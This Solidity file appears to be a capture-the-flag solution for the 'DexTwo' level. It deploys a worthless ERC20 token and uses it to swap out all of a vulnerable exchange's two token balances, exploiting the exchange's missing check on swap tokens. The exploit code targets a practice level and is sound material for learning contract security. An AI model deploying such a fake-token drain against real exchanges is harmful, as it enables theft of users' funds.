// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/DexTwo.sol";
import "OpenZeppelin-code/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract DexTwoAttack is ERC20{
    constructor() ERC20("zp","zp"){
        _mint(address(this), 1000);
    }
    function att(address addr) public {
        this.approve(msg.sender, 1000);
        this.approve(addr, 1000);
        transferFrom(address(this), addr, 100);
        DexTwo(addr).swap(address(this),DexTwo(addr).token1(),100);
        DexTwo(addr).swap(address(this),DexTwo(addr).token2(),200);
    }
}